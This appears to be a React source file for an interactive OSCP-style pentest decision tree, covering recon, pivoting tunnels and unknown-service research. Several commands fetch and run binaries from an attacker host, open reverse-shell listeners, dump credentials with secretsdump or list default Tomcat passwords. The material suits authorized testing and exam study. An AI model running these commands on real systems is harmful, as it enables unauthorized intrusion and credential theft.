import React, { useState, useEffect, useRef } from "react";

// ─────────────────────────────────────────────
//  NODE GRAPH
// ─────────────────────────────────────────────
const nodes = {

  // ══════════════════════════════════════════
  //  START
  // ══════════════════════════════════════════
  start: {
    phase: "RECON",
    title: "Engagement Start",
    body: "Set your variables first — every command references them. What is your current situation?",
    cmd: `export ip=10.10.10.10
export SUBNET=192.168.185.0/24
export LHOST=10.10.14.x
export LPORT=443
export DOMAIN=domain.com

mkdir -p ~/results/$ip/{scans,exploits,loot,screenshots,tunnels}
cd ~/results/$ip`,
    warn: null,
    choices: [
      { label: "Single target IP — full port scan", next: "full_portscan" },
      { label: "Subnet — need to find live hosts first", next: "host_discovery" },
      { label: "Got a shell — need to pivot deeper", next: "pivot_start" },
      { label: "Documentation — ATT&CK structured notes", next: "reporting" },
      { label: "I am stuck / spinning / losing time", next: "mindset_stuck" },
      { label: "Pre-exam setup — before the clock starts", next: "mindset_preexam" },
      { label: "Jump to technique — skip the flow", next: "jump_menu" },
    ],
  },


  // ══════════════════════════════════════════
  //  JUMP MENU — DIRECT TECHNIQUE ACCESS
  // ══════════════════════════════════════════

  jump_menu: {
    phase: "JUMP",
    title: "Jump to Technique",
    body: "Direct access to any section. Use this for labs, CTFs, or when you already know what you are dealing with and need the technique fast.",
    cmd: `# No commands here — pick your domain`,
    warn: null,
    choices: [
      { label: "Web attacks", next: "jump_web" },
      { label: "Virtual host enumeration", next: "vhost_enum" },
      { label: "SQL injection", next: "jump_sqli" },
      { label: "Shells & payloads", next: "jump_shells" },
      { label: "Linux privesc", next: "jump_linux" },
      { label: "Windows privesc", next: "jump_windows" },
      { label: "Active Directory", next: "jump_ad" },
      { label: "Services & ports", next: "jump_services" },
      { label: "Pivoting & tunnels", next: "jump_pivot" },
      { label: "Documentation & reporting", next: "reporting" },
      { label: "Back to start", next: "start" },
    ],
  },

  jump_web: {
    phase: "JUMP",
    title: "Web Attacks — Jump Menu",
    body: "Pick the technique directly.",
    cmd: `# Web attack reference`,
    warn: null,
    choices: [
      { label: "Web enumeration (gobuster/feroxbuster/nikto)", next: "web_enum" },
      { label: "Deep fuzzing / parameter brute force", next: "web_fuzz_deep" },
      { label: "Parameter found — test it", next: "param_found" },
      { label: "SQL injection", next: "jump_sqli" },
      { label: "File upload bypass", next: "file_upload" },
      { label: "LFI → RCE chain", next: "lfi" },
      { label: "SSRF", next: "ssrf" },
      { label: "SSTI — template injection", next: "ssti" },
      { label: "XXE", next: "xxe" },
      { label: "XSS", next: "xss" },
      { label: "IDOR", next: "idor" },
      { label: "Command injection", next: "cmd_injection" },
      { label: "WordPress", next: "wordpress" },
      { label: "Login page — brute / bypass", next: "login_page" },
      { label: "Virtual host (vhost) enumeration", next: "vhost_enum" },
      { label: "Subdomain enumeration", next: "subdomain_enum" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_sqli: {
    phase: "JUMP",
    title: "SQL Injection — Jump Menu",
    body: "Pick by injection type or workflow stage.",
    cmd: `# SQLi reference index`,
    warn: null,
    choices: [
      { label: "Detection — identify injection type", next: "sqli_test" },
      { label: "Error-based extraction", next: "sqli_error" },
      { label: "UNION-based extraction", next: "sqli_union" },
      { label: "Blind boolean extraction", next: "sqli_blind" },
      { label: "Time-based blind", next: "sqli_time" },
      { label: "WAF evasion", next: "sqli_waf" },
      { label: "sqlmap full escalation", next: "sqli_sqlmap" },
      { label: "SQLi → shell (INTO OUTFILE / xp_cmdshell)", next: "sqli_shell" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_shells: {
    phase: "JUMP",
    title: "Shells & Payloads — Jump Menu",
    body: "Listener setup, payload generation, shell stabilization, troubleshooting.",
    cmd: `# Shell reference index`,
    warn: null,
    choices: [
      { label: "Catch a reverse shell", next: "reverse_shell" },
      { label: "Shell not catching — troubleshoot", next: "shell_troubleshoot" },
      { label: "Bind shell (outbound filtered)", next: "shell_bind" },
      { label: "Meterpreter — setup and usage", next: "shell_meterpreter" },
      { label: "Upgrade dumb shell to full TTY", next: "shell_upgrade" },
      { label: "Buffer overflow (Windows x86)", next: "bof" },
      { label: "Client-side attacks", next: "client_side" },
      { label: "AMSI / AV bypass", next: "amsi_bypass" },
      { label: "File transfer — get tools on target", next: "file_transfer" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_linux: {
    phase: "JUMP",
    title: "Linux Privesc — Jump Menu",
    body: "Pick the vector directly.",
    cmd: `# Linux privesc reference`,
    warn: null,
    choices: [
      { label: "Initial foothold — orient and enumerate", next: "linux_post_exploit" },
      { label: "LinPEAS — automated enum", next: "linpeas" },
      { label: "sudo -l — quickest win", next: "sudo_check" },
      { label: "SUID binaries", next: "suid_check" },
      { label: "Cron jobs", next: "cron_check" },
      { label: "Groups / PATH hijack", next: "linux_privesc_extra" },
      { label: "Deep manual enum (capabilities/passwd/NFS)", next: "linux_manual_enum" },
      { label: "Kernel exploit", next: "kernel_exploit" },
      { label: "Password hunting — files/history/configs", next: "linux_password_hunt" },
      { label: "Custom wordlist generation", next: "custom_wordlist" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_windows: {
    phase: "JUMP",
    title: "Windows Privesc — Jump Menu",
    body: "Pick the vector directly.",
    cmd: `# Windows privesc reference`,
    warn: null,
    choices: [
      { label: "Initial foothold — orient and enumerate", next: "windows_post_exploit" },
      { label: "WinPEAS — automated enum", next: "winpeas" },
      { label: "Token impersonation (Potato attacks)", next: "token_privs" },
      { label: "Unquoted service path", next: "unquoted_service" },
      { label: "Weak service permissions", next: "weak_service" },
      { label: "AlwaysInstallElevated", next: "always_install_elevated" },
      { label: "Credential hunting (registry/files/SAM)", next: "windows_creds" },
      { label: "Pass the Hash", next: "pth" },
      { label: "DPAPI credential extraction", next: "dpapi" },
      { label: "Manual enum (tasks/DLL/UAC)", next: "windows_manual_enum" },
      { label: "Scheduled task exploitation", next: "win_schtask" },
      { label: "DLL hijacking", next: "win_dll_hijack" },
      { label: "UAC bypass", next: "win_uac_bypass" },
      { label: "AMSI / AV bypass", next: "amsi_bypass" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_ad: {
    phase: "JUMP",
    title: "Active Directory — Jump Menu",
    body: "Pick the AD technique directly.",
    cmd: `# AD reference index`,
    warn: null,
    choices: [
      { label: "AD entry — assumed breach", next: "ad_nocreds" },
      { label: "BloodHound — run and read", next: "bloodhound" },
      { label: "Responder / LLMNR poisoning", next: "responder" },
      { label: "AS-REP roasting", next: "asrep_roast" },
      { label: "Kerberoasting", next: "kerberoast" },
      { label: "Password spraying", next: "ad_spray" },
      { label: "ACL abuse (GenericAll/WriteDACL)", next: "acl_abuse" },
      { label: "Delegation attacks", next: "delegation" },
      { label: "AD Certificate Services (ESC1/ESC4)", next: "adcs" },
      { label: "DCSync — domain owned", next: "dcsync" },
      { label: "Lateral movement (PtH/WinRM/SMB)", next: "lateral_movement" },
      { label: "Manual enum — BloodHound dead end", next: "ad_manual" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_services: {
    phase: "JUMP",
    title: "Services & Ports — Jump Menu",
    body: "Jump directly to a service. Same as unknown_service but organized by category.",
    cmd: `# Service reference index`,
    warn: null,
    choices: [
      { label: "Web (HTTP/HTTPS) — full enum", next: "web_enum" },
      { label: "SMB (445)", next: "smb_enum" },
      { label: "FTP (21)", next: "ftp_enum" },
      { label: "SSH (22)", next: "ssh_only" },
      { label: "RDP (3389)", next: "rdp" },
      { label: "WinRM (5985)", next: "winrm_access" },
      { label: "MySQL (3306)", next: "mysql" },
      { label: "MSSQL (1433)", next: "mssql" },
      { label: "PostgreSQL (5432)", next: "postgres" },
      { label: "MongoDB (27017)", next: "mongodb" },
      { label: "Redis (6379)", next: "redis" },
      { label: "NFS (2049)", next: "nfs_enum" },
      { label: "DNS (53)", next: "dns_enum" },
      { label: "SMTP (25/587)", next: "smtp_enum" },
      { label: "Tomcat / Java", next: "tomcat" },
      { label: "Jenkins", next: "jenkins" },
      { label: "Grafana (3000)", next: "grafana" },
      { label: "Splunk (8000/8089)", next: "splunkd" },
      { label: "Docker API (2375)", next: "docker_api" },
      { label: "Elasticsearch (9200)", next: "elasticsearch" },
      { label: "Port knocking", next: "port_knocking" },
      { label: "Credential reuse — spray everywhere", next: "cred_reuse" },
      { label: "File transfer — get tools on target", next: "file_transfer" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_pivot: {
    phase: "JUMP",
    title: "Pivoting & Tunnels — Jump Menu",
    body: "Jump directly to a tunneling technique.",
    cmd: `# Pivot reference index`,
    warn: null,
    choices: [
      { label: "Pivot strategy — map the network", next: "pivot_start" },
      { label: "Ligolo-ng tunnel", next: "ligolo" },
      { label: "SSH tunnel / SOCKS proxy", next: "ssh_tunnel" },
      { label: "Chisel tunnel", next: "chisel" },
      { label: "Manual socat / netsh port forward", next: "manual_portfwd" },
      { label: "Double pivot — chain through two hosts", next: "double_pivot" },
      { label: "Internal host discovery (post-pivot)", next: "pivot_discovery" },
      { label: "Port scan through tunnel", next: "pivot_portscan" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  host_discovery: {
    phase: "DISCOVERY",
    title: "Host Discovery",
    body: "Run all methods in parallel. ARP cannot be blocked on the local subnet — most reliable method. ICMP gets filtered constantly. Merge everything into one list.",
    cmd: `sudo nmap -sn $SUBNET -oG scan.txt
grep Up scan.txt | cut -d " " -f 2 > ips_nmap.txt

sudo arp-scan $SUBNET | tee arp.txt

fping -a -g $SUBNET 2>/dev/null | tee fping.txt

cat ips_nmap.txt fping.txt | sort -u | grep -v "^$" > live_hosts.txt
cat live_hosts.txt`,
    warn: "ARP only works on your local subnet. Through a tunnel ARP is gone — use ICMP and TCP probes only.",
    choices: [
      { label: "Have host list — mass port scan", next: "mass_portscan" },
      { label: "One interesting host — deep scan it", next: "full_portscan" },
    ],
  },

  mass_portscan: {
    phase: "DISCOVERY",
    title: "Mass Port Scan",
    body: "Scan the full live host list. Grep for high-value ports to triage targets fast.",
    cmd: `nmap -iL live_hosts.txt -p- --min-rate 5000 -T4 -oG mass_scan.txt
grep "open" mass_scan.txt

rustscan -a live_hosts.txt -- -sC -sV -oN rustscan.txt

grep -E "80|443|445|22|3389|5985|8080|1433|3306" mass_scan.txt`,
    warn: null,
    choices: [
      { label: "Found web target", next: "web_enum" },
      { label: "Found SMB target", next: "smb_enum" },
      { label: "Found Windows (RDP/WinRM)", next: "windows_post_exploit" },
      { label: "Found AD/DC", next: "ad_nocreds" },
      { label: "Single target — targeted scan", next: "targeted_scan" },
    ],
  },

  pivot_start: {
    phase: "PIVOT",
    title: "Pivot — Orient First",
    body: "You have a foothold on a machine with access to an internal network. Draw the map before you build anything. The routing table, ARP cache, and /etc/hosts tell you the topology. The question you are answering: what subnets can this machine reach that you cannot? That gap is your pivot. Tool choice depends on what you can upload, what ports are open outbound, and whether you have SSH creds.",
    cmd: `# ── LINUX — network orientation ──────────
ip a                          # all interfaces + IPs
ip route                      # routing table — look for non-tun0 subnets
arp -a                        # ARP cache — who this machine has talked to
cat /etc/hosts                # static hostname → IP mappings
ss -tulpn                     # listening services on internal interfaces
cat /proc/net/fib_trie 2>/dev/null | grep -E "LOCAL|HOST"  # deeper subnet enumeration

# ── WINDOWS — network orientation ─────────
ipconfig /all                 # all interfaces
route print                   # routing table
arp -a                        # ARP cache
netstat -ano                  # active connections + listening ports
type C:\Windows\System32\drivers\etc\hosts

# ── IDENTIFY THE GAP ──────────────────────
# Your tun0: 10.11.x.x (VPN)
# Pivot machine eth0: 10.11.x.x (VPN side)
# Pivot machine eth1: 172.16.50.x ← THIS is the internal network you need
export PIVOT_SUBNET=172.16.50.0/24
export PIVOT_HOST=172.16.50.x    # first target on internal net

# ── CHOOSE YOUR TUNNEL ────────────────────
# Ligolo-ng  → best default. Full IP routing, no proxychains. Needs binary upload.
# SSH tunnel → best when you have SSH creds. No upload needed.
# Chisel     → best when direct TCP is blocked (runs over HTTP).
# socat/netsh → last resort. One port at a time. No upload of special tools needed.`,
    warn: "Draw the network before building anything. Note every IP, every subnet, every interface. Pivot machines often have 2+ interfaces — internal and external. The internal interface subnet is your target. Confirm you can reach the pivot machine on a consistent port before starting any tunnel.",
    choices: [
      { label: "Ligolo-ng (best default — needs binary upload)", next: "ligolo" },
      { label: "SSH creds available — SSH tunnel", next: "ssh_tunnel" },
      { label: "Direct TCP blocked — Chisel over HTTP", next: "chisel" },
      { label: "Cannot upload anything — socat/netsh", next: "manual_portfwd" },
    ],
  },

  ligolo: {
    phase: "PIVOT",
    title: "Ligolo-ng Tunnel",
    body: "Best tunnel for OSCP. Proxy runs on Kali, agent runs on pivot machine. Once the tunnel is up your Kali tools (nmap, feroxbuster, evil-winrm, impacket) hit internal hosts directly with no proxychains wrapper needed. Full IP routing — UDP and ICMP work too, unlike SOCKS.",
    cmd: `# ── STEP 1: KALI SETUP (one time per session) ──
# Create tun interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start the proxy (listens for agents)
./proxy -selfcert -laddr 0.0.0.0:11601
# Binary: https://github.com/nicocha30/ligolo-ng/releases
# Keep this running in a dedicated tmux pane

# ── STEP 2: UPLOAD + RUN AGENT ON PIVOT ──
# Transfer the agent to the pivot machine first:
# Kali: python3 -m http.server 80
# Pivot (Linux):
wget http://$LHOST/agent -O /tmp/agent && chmod +x /tmp/agent
/tmp/agent -connect $LHOST:11601 -ignore-cert &

# Pivot (Windows):
certutil -urlcache -split -f http://$LHOST/agent.exe C:\\Windows\\Temp\\agent.exe
C:\\Windows\\Temp\\agent.exe -connect $LHOST:11601 -ignore-cert

# ── STEP 3: ACTIVATE IN PROXY CONSOLE ────
# Back in the proxy tmux pane — you'll see a session appear:
session               # list available sessions
# Type the session number, press Enter
start                 # activates the tunnel

# ── STEP 4: ADD ROUTE ON KALI ─────────────
# Route traffic to the internal subnet via ligolo interface:
sudo ip route add $PIVOT_SUBNET dev ligolo

# Verify tunnel works:
ping 172.16.50.1      # should get replies

# ── STEP 5: USE LIKE A LOCAL NETWORK ─────
# No proxychains needed — tools work directly:
nmap -p- --min-rate 2000 172.16.50.5
evil-winrm -i 172.16.50.5 -u administrator -p 'Pass123!'
curl http://172.16.50.5/
impacket-secretsdump domain/user:'pass'@172.16.50.5

# ── LISTENER FOR REVERSE SHELLS THROUGH TUNNEL ──
# If you need a reverse shell FROM the internal network back to Kali:
# Add a listener in ligolo proxy console:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# This forwards connections from pivot:4444 → Kali:4444
# Set LHOST to the pivot's internal IP in your payload
# Catch on Kali: nc -nlvp 4444`,
    warn: "Add the route AFTER 'start' — not before. If the tunnel shows connected but pings fail, check the route is on the ligolo interface (not tun0). For reverse shells FROM internal hosts back to Kali through ligolo: use listener_add in the proxy console and set LHOST to the pivot machine's internal IP in your payload.",
    choices: [
      { label: "Tunnel up — discover internal hosts", next: "pivot_discovery" },
      { label: "Tunnel up — scan known internal target", next: "pivot_portscan" },
      { label: "Need to chain another hop", next: "double_pivot" },
      { label: "Need reverse shell from internal host", next: "reverse_shell" },
    ],
  },

  ssh_tunnel: {
    phase: "PIVOT",
    title: "SSH Tunnel",
    body: "If you have SSH creds to the pivot, this is the fastest path — no binary uploads, no tool transfer. Three modes: dynamic (SOCKS proxy for proxychains), local port forward (expose one internal service on Kali), remote port forward (catch reverse shells through the pivot). Know which you need before typing.",
    cmd: `# ── MODE 1: DYNAMIC — FULL SOCKS PROXY ───
# Best for broad enumeration through proxychains
ssh -D 1080 -N -f -o StrictHostKeyChecking=no user@$ip
# -D 1080  → opens SOCKS5 proxy on Kali localhost:1080
# -N       → no command (tunnel only)
# -f       → background the process

# Configure proxychains:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
# (comment out any existing socks4 line)

# Use with tools:
proxychains nmap -sT -p 22,80,443,445,3389,5985,8080 172.16.50.5
proxychains curl -sv http://172.16.50.5/
proxychains evil-winrm -i 172.16.50.5 -u admin -p 'Pass123!'
proxychains impacket-secretsdump domain/user:'pass'@172.16.50.5

# ── MODE 2: LOCAL PORT FORWARD ────────────
# Expose one specific internal service on a Kali port
# Syntax: ssh -L [LOCAL_PORT]:[INTERNAL_HOST]:[INTERNAL_PORT] user@pivot
ssh -L 8080:172.16.50.5:80 user@$ip -N     # internal web → localhost:8080
ssh -L 3389:172.16.50.5:3389 user@$ip -N   # internal RDP → localhost:3389
ssh -L 1433:172.16.50.5:1433 user@$ip -N   # internal MSSQL → localhost:1433
ssh -L 5985:172.16.50.5:5985 user@$ip -N   # internal WinRM → localhost:5985

# Then access via localhost:
curl http://localhost:8080
xfreerdp /v:localhost:3389 /u:admin /p:'Pass123!'
evil-winrm -i localhost -u admin -p 'Pass123!'

# ── MODE 3: REMOTE PORT FORWARD ───────────
# Catch a reverse shell from an internal host back through the pivot to Kali
# Syntax: ssh -R [PIVOT_PORT]:127.0.0.1:[KALI_PORT] user@pivot
ssh -R 4444:127.0.0.1:4444 user@$ip -N
# Now: set LHOST = pivot's internal IP in your reverse shell payload
# Internal host connects to pivot:4444 → forwarded to Kali:4444
# Catch: nc -nlvp 4444 on Kali

# ── MODE 4: SSH JUMP HOST (ProxyJump) ────
# SSH directly to internal host in one command
ssh -J user@$ip user2@172.16.50.5
# Or chain multiple hops:
ssh -J user@$ip,user2@172.16.50.5 user3@10.10.10.5

# ── SSHUTTLE — transparent proxy (no proxychains needed) ──
# Routes all traffic to subnet through SSH without modifying tools
sshuttle -r user@$ip 172.16.50.0/24 --ssh-cmd 'ssh -o StrictHostKeyChecking=no'
# Now nmap, curl, browsers all reach 172.16.50.0/24 directly`,
    warn: "proxychains + nmap: ALWAYS use -sT (TCP connect scan). -sS (SYN scan) requires raw sockets and will hang or give false results through SOCKS. sshuttle is a great alternative — it requires no proxychains wrapper and works with UDP-adjacent tools. Kill stale SSH tunnels: kill $(pgrep -f 'ssh -[DLR]')",
    choices: [
      { label: "SOCKS proxy up — discover internal hosts", next: "pivot_discovery" },
      { label: "Port forward set — access specific service", next: "pivot_portscan" },
      { label: "Need full routing — try Ligolo-ng", next: "ligolo" },
    ],
  },

  manual_portfwd: {
    phase: "PIVOT",
    title: "Manual Port Forward",
    body: "No binary uploads possible. socat on Linux, netsh on Windows. One port at a time.",
    cmd: `socat TCP-LISTEN:8080,fork TCP:172.16.50.5:80 &

netsh interface portproxy add v4tov4 \\
  listenaddress=0.0.0.0 listenport=8080 \\
  connectaddress=172.16.50.5 connectport=80
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 \\
  listenaddress=0.0.0.0 listenport=8080

iptables -t nat -A PREROUTING -p tcp --dport 8080 \\
  -j DNAT --to-destination 172.16.50.5:80
iptables -t nat -A POSTROUTING -j MASQUERADE`,
    warn: null,
    choices: [
      { label: "Port forwarded — access service on Kali", next: "web_enum" },
      { label: "Need full network access — try Chisel", next: "chisel" },
    ],
  },

  chisel: {
    phase: "PIVOT",
    title: "Chisel Tunnel",
    body: "Chisel tunnels over HTTP/HTTPS — the best choice when direct TCP outbound is blocked by a firewall but HTTP(S) is allowed (common in corporate environments). Server on Kali, client on pivot. Supports SOCKS5 reverse proxy and individual port forwards. Works on both Linux and Windows.",
    cmd: `# ── STEP 1: KALI — start chisel server ───
# --reverse → allows clients to open reverse tunnels
# --socks5  → enables SOCKS5 proxy mode
./chisel server -p 8080 --reverse --socks5
# Binary: https://github.com/jpillora/chisel/releases
# Run in a tmux pane — keep it alive

# ── STEP 2: TRANSFER CHISEL TO PIVOT ─────
# Kali: python3 -m http.server 80
# Linux pivot:
wget http://$LHOST/chisel -O /tmp/chisel && chmod +x /tmp/chisel
# Windows pivot:
certutil -urlcache -split -f http://$LHOST/chisel.exe C:\\Windows\\Temp\\chisel.exe
powershell -c "Invoke-WebRequest http://$LHOST/chisel.exe -OutFile C:\\Windows\\Temp\\chisel.exe"

# ── STEP 3: PIVOT — connect to Kali ──────
# Full SOCKS5 reverse proxy (most common — broad access):
/tmp/chisel client $LHOST:8080 R:socks
.\\chisel.exe client $LHOST:8080 R:socks

# Specific port forward (expose one internal service):
# Syntax: R:[LOCAL_PORT]:[INTERNAL_HOST]:[INTERNAL_PORT]
/tmp/chisel client $LHOST:8080 R:3306:172.16.50.5:3306   # MySQL
/tmp/chisel client $LHOST:8080 R:8888:172.16.50.5:80     # web on 8888 locally
.\\chisel.exe client $LHOST:8080 R:5985:172.16.50.5:5985 # WinRM

# ── STEP 4: USE THE TUNNEL ────────────────
# SOCKS proxy is on Kali 127.0.0.1:1080 (chisel default)
# Configure proxychains:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

proxychains nmap -sT -p 22,80,443,445,3389,5985 172.16.50.5
proxychains curl http://172.16.50.5/
proxychains evil-winrm -i 172.16.50.5 -u admin -p 'Pass!'
proxychains impacket-secretsdump domain/user:'pass'@172.16.50.5

# Direct access for port-forwarded services (no proxychains):
curl http://localhost:8888/            # if you forwarded 172.16.50.5:80 → 8888
evil-winrm -i localhost -u admin -p 'Pass!'   # WinRM on localhost

# ── OVER HTTPS (if HTTP is inspected) ────
./chisel server -p 443 --reverse --socks5 --tls-key key.pem --tls-cert cert.pem
/tmp/chisel client --tls-skip-verify https://$LHOST:443 R:socks`,
    warn: "proxychains + nmap: ALWAYS -sT. UDP and ICMP do not traverse SOCKS — host discovery through chisel/proxychains needs TCP-based probes (-sT -p 80). If the firewall is DPI-aware and blocking chisel's HTTP, try --tls flags to wrap in HTTPS. Chisel's SOCKS proxy defaults to port 1080 — confirm in proxychains4.conf.",
    choices: [
      { label: "Tunnel up — discover internal hosts", next: "pivot_discovery" },
      { label: "Tunnel up — scan internal target", next: "pivot_portscan" },
      { label: "HTTP also blocked — try DNS tunnel", next: "manual_portfwd" },
    ],
  },

  pivot_discovery: {
    phase: "PIVOT",
    title: "Internal Host Discovery",
    body: "You are on a routed network now — ARP is gone. ICMP and TCP probes only. Through Ligolo scan directly. Through proxychains use -sT and drop the rate.",
    cmd: `sudo nmap -sn $PIVOT_SUBNET -oG pivot_scan.txt
grep Up pivot_scan.txt | cut -d " " -f 2 > pivot_hosts.txt
fping -a -g $PIVOT_SUBNET 2>/dev/null >> pivot_hosts.txt

proxychains nmap -sT -sn $PIVOT_SUBNET --min-rate 200

for i in $(seq 1 254); do
  ping -c1 -W1 172.16.50.$i &>/dev/null && echo "172.16.50.$i" &
done; wait

for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.50.%i | findstr "TTL"

sort -u pivot_hosts.txt > internal_live.txt`,
    warn: "Max --min-rate 200 through proxychains. Higher rates drop packets.",
    choices: [
      { label: "Found internal hosts — port scan them", next: "pivot_portscan" },
      { label: "Found AD / DC", next: "ad_nocreds" },
      { label: "Found another subnet — double pivot", next: "double_pivot" },
    ],
  },

  pivot_portscan: {
    phase: "PIVOT",
    title: "Port Scan Through Tunnel",
    body: "Ligolo: treat like a direct connection. Proxychains: -sT required, lower rate. Never -sS through SOCKS.",
    cmd: `nmap -p- --min-rate 2000 -T3 172.16.50.5 -oN pivot_allports.txt
nmap -p <PORTS> -sC -sV 172.16.50.5 -oN pivot_targeted.txt

proxychains nmap -sT -p 80,443,445,22,3389,5985,1433,3306 \\
  172.16.50.5 --open -T2
proxychains curl -sv http://172.16.50.5

for host in $(cat internal_live.txt); do
  nmap -p 80,443,445,22,3389,5985,8080 \\
    --open $host -oN pivot_$host.txt
done`,
    warn: "Never -sS through proxychains. Always -sT.",
    choices: [
      { label: "Found internal web", next: "web_enum" },
      { label: "Found internal SMB", next: "smb_enum" },
      { label: "Found internal AD / DC", next: "ad_nocreds" },
      { label: "Found another pivot layer", next: "double_pivot" },
      { label: "Full service enum", next: "targeted_scan" },
    ],
  },

  double_pivot: {
    phase: "PIVOT",
    title: "Double Pivot",
    body: "Three-hop chain: Kali to Pivot1 to Pivot2 to Target. Chain Ligolo listeners or nest SSH tunnels. Draw the map first.",
    cmd: `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

./agent -connect 172.16.50.X:11601 -ignore-cert

session
[select pivot2]
start

sudo ip route add 10.10.10.0/24 dev ligolo

ssh -D 1080 user@pivot1 -N &
proxychains ssh -D 1081 user@172.16.50.X -N &`,
    warn: "Every hop adds latency. Drop scan rates further with each layer.",
    choices: [
      { label: "Double pivot up — discover third network", next: "pivot_discovery" },
      { label: "Reached target — enumerate it", next: "targeted_scan" },
    ],
  },

  research_unknown: {
    phase: "RECON",
    title: "Identify the Unknown Service",
    body: "nmap couldn't identify the service. That's not a dead end — it's an invitation. Unknown ports are gifts: non-standard services are usually less hardened, and the path forward is already in what nmap already returned. The discipline is reading before reaching for more tools. The REMOTEMOUSE lesson: the banner 'luminateOK' on port 1978 was sitting in the nmap output. The hostname 'REMOTEMOUSE' was in the smb-os-discovery block. The entire intended path was already there — it just needed to be read.",
    cmd: `# ── STEP 1: READ WHAT NMAP ALREADY GAVE YOU ──
# Do this before running any new commands
# Look for these in your existing scan output:

# Banner strings on the unknown port:
# 1978/tcp open  unrecognized
# | fingerprint-strings:
# |   NULL:
# |     luminateOK       ← THIS IS YOUR ANSWER
# |     system windows 6.2

# Hostname from smb-os-discovery:
# | smb-os-discovery:
# |   Computer name: REMOTEMOUSE   ← THIS IS YOUR ANSWER

# Version string nmap DID identify:
# 1978/tcp open  luminate?   ← even a ? is data

# PTR record / DNS name:
# Nmap scan report for SERVICENAME.domain.local

# ── STEP 2: MANUAL BANNER GRAB ────────────
# If nmap didn't get a banner — grab it yourself
nc -nv $ip <PORT>
# Wait 5-10 seconds — some services respond to connection only

# Try sending HTTP to it:
curl -sv http://$ip:<PORT>
curl -sv https://$ip:<PORT>

# Try sending nothing and reading the response:
echo "" | nc -nv $ip <PORT>

# Try sending a newline:
printf "\r\n" | nc -nv $ip <PORT>

# ── STEP 3: GOOGLE THE EXACT BANNER STRING ─
# Take the EXACT string from the banner and Google it in quotes
# "luminateOK"           → Remote Mouse immediately
# "220 ProFTPD"          → ProFTPD FTP server
# "530 Password required" → FTP with auth
# "elastic"              → Elasticsearch
# Do NOT paraphrase — the exact string is a fingerprint

# Also try:
# port <NUMBER> service
# port 1978 windows
# "<banner string>" exploit
# "<banner string>" vulnerability

# ── STEP 4: SHODAN / CENSYS (if Google is slow) ──
# Search Shodan for the port number to see what normally runs there:
# https://www.shodan.io/search?query=port%3A1978
# https://search.censys.io/

# ── STEP 5: NMAP AGGRESSIVE PROBE ────────
# Throw everything at it — scripts + version + intensity max
nmap -p <PORT> -sC -sV --version-intensity 9 -A $ip

# ── STEP 6: ONCE YOU HAVE A NAME — SEARCHSPLOIT ──
searchsploit <service name>
searchsploit <service name> <version>

# Auto from nmap (if version now identified):
searchsploit $(nmap -p <PORT> -sV $ip | grep open | awk '{print $3,$4}')`,
    warn: "The hostname is enumeration. 'REMOTEMOUSE' in smb-os-discovery is not decoration — it is the box telling you what to attack. The banner string is a fingerprint. Google the exact string in quotes before you run any more tools. Unknown ports are the intended path more often than not — experienced testers get excited when nmap shows a question mark.",
    choices: [
      { label: "Banner identified — searchsploit it", next: "searchsploit_web" },
      { label: "Identified as web service", next: "web_enum" },
      { label: "Identified as known service", next: "unknown_service" },
      { label: "Nothing — service completely opaque", next: "unknown_service" },
    ],
  },

  unknown_service: {
    phase: "RECON",
    title: "Unknown Service / Port",
    body: "nmap gave you a port you don't recognize. Banner grab first, then version-specific research. Every service has a fingerprint.",
    cmd: `nc -nv $ip <PORT>
curl -sv http://$ip:<PORT>
curl -sv https://$ip:<PORT>

nmap -p <PORT> -sC -sV --version-intensity 9 $ip

# Common high-port services:
# 8080/8443/8009 — Tomcat, JBoss, GlassFish
# 9200/9300     — Elasticsearch
# 6379          — Redis
# 27017         — MongoDB
# 1433          — MSSQL
# 1099          — Java RMI
# 5432          — PostgreSQL
# 11211         — Memcached
# 2181          — ZooKeeper
# 4848          — GlassFish admin

# ── AUTO-SEARCHSPLOIT FROM BANNER ────────
# Most reliable — let nmap get the version then pipe straight to searchsploit:
searchsploit $(nmap -p <PORT> -sV $ip | grep open | awk '{print $3,$4}')

# Example output if port 21 is ProFTPD 1.3.5:
# → searchsploit ProFTPD 1.3.5
# Use this pattern for ANY unknown port — nmap identifies, searchsploit hunts

# Or use the XML method (catches all ports at once):
nmap -p <PORT> -sV $ip -oX service.xml
searchsploit --nmap service.xml`,
    warn: null,
    choices: [
      { label: "Tomcat / JBoss / Java app server", next: "tomcat" },
      { label: "Redis (6379)", next: "redis" },
      { label: "MSSQL (1433)", next: "mssql" },
      { label: "PostgreSQL (5432)", next: "postgres" },
      { label: "MongoDB (27017)", next: "mongodb" },
      { label: "MySQL (3306)", next: "mysql" },
      { label: "NFS (2049)", next: "nfs_enum" },
      { label: "Rsync (873)", next: "rsync" },
      { label: "SMTP (25/587)", next: "smtp_enum" },
      { label: "Elasticsearch (9200)", next: "elasticsearch" },
      { label: "Docker API (2375/2376)", next: "docker_api" },
      { label: "VNC (5900)", next: "vnc" },
      { label: "DNS (53)", next: "dns_enum" },
      { label: "Grafana (3000)", next: "grafana" },
      { label: "Splunk (8000/8089)", next: "splunkd" },
      { label: "Memcached (11211)", next: "memcached" },
      { label: "Java RMI (1099)", next: "java_rmi" },
      { label: "Web interface found", next: "web_enum" },
      { label: "Searchsploit hit", next: "searchsploit_web" },
    ],
  },

  tomcat: {
    phase: "WEB",
    title: "Apache Tomcat",
    body: "Manager console upload is the classic path. Default creds are shockingly common. AJP connector (8009) enables Ghostcat if exposed.",
    cmd: `# Manager console
http://$ip:8080/manager/html
http://$ip:8080/host-manager/html

# Default creds to try:
# tomcat:tomcat   tomcat:s3cret   admin:admin
